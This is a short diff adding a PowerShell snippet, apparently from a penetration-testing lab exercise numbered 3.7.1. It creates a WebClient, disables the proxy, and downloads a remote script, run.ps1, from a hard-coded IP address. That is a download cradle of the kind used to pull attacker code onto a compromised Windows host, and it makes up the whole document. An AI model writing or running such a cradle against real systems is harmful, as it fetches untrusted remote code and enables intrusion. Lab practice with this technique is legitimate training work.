@@ -1,0 +1,4 @@
+$wc = new-object system.net.WebClient
+$wc.proxy = $null
+$wc.DownloadString("http://192.168.119.120/run.ps1")
+#3.7.1
